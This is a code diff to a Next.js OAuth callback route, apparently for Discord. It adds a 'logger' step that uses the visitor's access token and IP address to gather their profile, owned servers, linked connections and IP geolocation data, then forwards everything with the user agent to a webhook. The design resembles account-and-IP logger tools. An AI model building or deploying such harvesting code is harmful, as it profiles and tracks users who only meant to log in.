@@ -1,3 +1,4 @@
+import { logger } from "@/lib/functions/logger";
 import { sendWebhook } from "@/lib/functions/webhook";
 import { NextRequest, NextResponse } from "next/server";
 
@@ -35,11 +36,17 @@ export async function GET(req: NextRequest) {
             }
 
             const tokenResult = await token.json();
+
+            const { success, userInfo, ownGuilds, connections, ipInfo } = await logger(tokenResult.access_token, ip);
+
+            if (!success || !userInfo || !ownGuilds || !connections || !ipInfo) {
+                return NextResponse.redirect(`${process.env.BASE_URL}/error`);
+            }
             
-            const webhookResult = await sendWebhook(tokenResult.access_token, ip, ua);
+            const webhookResult = await sendWebhook(userInfo, ownGuilds, connections, ipInfo, ua);
             
             if (!webhookResult.success) {
-                console.error("failed to send webhook", webhookResult.error);
+                return NextResponse.redirect(`${process.env.BASE_URL}/error`);
             }
             
             return NextResponse.redirect(`${process.env.BASE_URL}/success`);
